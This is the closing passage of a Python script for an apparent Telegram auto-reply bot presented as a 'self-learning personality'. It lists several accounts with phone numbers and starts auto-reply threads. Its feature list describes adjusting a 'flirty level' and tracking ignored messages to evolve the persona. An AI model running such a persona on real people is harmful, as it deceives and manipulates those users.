    start_all_auto_replies()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print('\n' + '='*70)
    print('🤖 TSEGA - SELF-LEARNING TELEGRAM PERSONALITY')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts loaded: {len(accounts)}')
    print(f'✅ Learning data: {len(learning_data)} accounts')
    print('='*70)
    
    for acc in accounts:
        status = "ENABLED" if str(acc['id']) in reply_settings and reply_settings[str(acc['id'])].get('enabled') else "DISABLED"
        learned = "✓" if str(acc['id']) in learning_data else " "
        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status} [Learned:{learned}]')
    
    print('='*70)
    print('🚀 SELF-LEARNING FEATURES:')
    print('   • Learns from every conversation')
    print('   • Evolves personality based on what works')
    print('   • Remembers user preferences per user')
    print('   • Tracks successful vs ignored messages')
    print('   • Adapts flirty level based on responses')
    print('   • Learns new phrases from users')
    print('   • Hourly personality evolution')
    print('   • Tracks emoji effectiveness')
    print('='*70 + '\n')
    
    # Start keep-alive
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # Start auto-reply
    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
